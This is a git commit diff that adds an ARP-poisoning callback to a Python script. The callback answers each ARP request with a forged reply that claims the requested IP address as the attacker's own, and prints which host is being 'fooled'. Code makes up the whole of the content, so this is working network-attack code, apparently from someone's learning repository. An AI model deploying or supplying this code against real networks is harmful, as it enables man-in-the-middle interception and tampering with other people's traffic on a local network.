a686418bc58272e586ce90442f020c614ecacaf6
Faan Ross <moi@faanross.com>
2023-03-10 12:04:28 -0500

    arp spoofing+

--- arp_poison_v2_nc.py
+++ arp_poison_v2_nc.py
@@ -12,3 +12,13 @@ if len(sys.argv) < 2:
 def arp_poison_callback( packet):
     # Got ARP request?
     if packet[ARP].op == 1:
+        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
+        answer[ARP].op = "is -at"
+        answer[ARP].hwdst = packet[ARP].hwsrc
+        answer[ARP].psrc = packet[ARP].pdst
+        answer[ARP].pdst = packet[ARP].psrc
+
+        print("Fooling " + packet[ ARP].psrc + " that " + \ 
+              packet[ARP].pdst + " is me")
+
+        sendp(answer , iface=sys.argv[1])
